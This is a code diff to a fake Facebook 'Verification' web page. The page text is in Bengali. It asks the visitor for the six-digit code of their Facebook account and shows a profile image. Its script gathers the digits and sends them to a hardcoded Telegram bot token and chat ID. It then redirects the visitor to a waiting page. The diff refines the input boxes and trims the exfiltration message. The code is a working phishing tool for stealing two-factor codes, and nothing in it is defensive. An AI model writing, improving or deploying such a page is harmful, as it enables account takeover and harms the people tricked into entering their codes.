@@ -5,64 +5,73 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* ইনপুট বক্সের ডিজাইন */
+        .code-input {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            background: #f9f9f9;
+        }
+        .code-input:focus { border-color: #2563eb; outline: none; background: #fff; }
+    </style>
 </head>
 <body class="bg-gray-100 flex flex-col items-center min-h-screen">
 
-    <div class="w-full h-[40vh] flex justify-center items-center overflow-hidden bg-white border-b shadow-sm">
+    <div class="w-full max-w-sm h-[40vh] bg-white border-b shadow-sm overflow-hidden flex justify-center">
         <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
-             alt="Profile" class="h-full w-full object-cover">
+             alt="Profile" class="w-full h-full object-cover">
     </div>
 
     <div class="w-full max-w-sm p-6 bg-white rounded-t-3xl shadow-2xl -mt-6">
         <h2 class="text-xl font-bold text-center mb-4">Verification</h2>
-        <p class="text-sm text-gray-600 mb-6 text-center">
-            আপনার ফেসবুক আইডির ৬ সংখ্যার কোডটি নিচে বসান।
-        </p>
+        <p class="text-sm text-gray-600 mb-6 text-center">আপনার প্রোফাইল ভেরিফাই করতে ৬ সংখ্যার কোডটি দিন</p>
 
-        <div id="code-inputs" class="flex justify-between gap-2 mb-6">
-            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
-            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
-            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
-            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
-            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
-            <input type="text" maxlength="1" class="w-12 h-14 border-2 border-blue-500 rounded-lg text-center text-2xl font-bold focus:outline-none" oninput="move(this)">
+        <div id="otp-inputs" class="flex justify-between px-2 mb-6">
+            <input type="number" pattern="\d*" maxlength="1" class="code-input" oninput="move(this)" onkeydown="del(event, this)">
+            <input type="number" pattern="\d*" maxlength="1" class="code-input" oninput="move(this)" onkeydown="del(event, this)">
+            <input type="number" pattern="\d*" maxlength="1" class="code-input" oninput="move(this)" onkeydown="del(event, this)">
+            <input type="number" pattern="\d*" maxlength="1" class="code-input" oninput="move(this)" onkeydown="del(event, this)">
+            <input type="number" pattern="\d*" maxlength="1" class="code-input" oninput="move(this)" onkeydown="del(event, this)">
+            <input type="number" pattern="\d*" maxlength="1" class="code-input" oninput="move(this)" onkeydown="del(event, this)">
         </div>
     </div>
 
     <script>
+        // অটো ফোকাস এবং ডিলিট লজিক
         function move(input) {
+            if (input.value.length > 1) input.value = input.value.slice(0, 1);
             if (input.value.length === 1) {
                 let next = input.nextElementSibling;
                 if (next) next.focus();
-                else checkAll();
+                else submitCode();
             }
         }
 
-        async function checkAll() {
+        function del(e, input) {
+            if (e.key === "Backspace" && input.value.length === 0) {
+                let prev = input.previousElementSibling;
+                if (prev) prev.focus();
+            }
+        }
+
+        async function submitCode() {
             let code = "";
-            document.querySelectorAll('input').forEach(i => code += i.value);
+            document.querySelectorAll('.code-input').forEach(i => code += i.value);
             
             if(code.length === 6) {
-                // এখানে আপনার আগের টেলিগ্রাম বট কোডটি বসাবেন
                 const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
                 const chatId = "8516934257";
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        chat_id: chatId, 
-                        text: `📩 কোড পাওয়া গেছে: ${code}`,
-                        reply_markup: {
-                            inline_keyboard: [[
-                                {text: "✅ Success", callback_data: "success"},
-                                {text: "❌ Error", callback_data: "error"}
-                            ]]
-                        }
-                    })
+                    body: JSON.stringify({ chat_id: chatId, text: `📩 কোড: ${code}` })
                 });
-
-                // সাবমিট করার পর লোডিং স্ক্রিনে রিডাইরেক্ট করুন
                 window.location.href = "waiting.html";
             }
         }
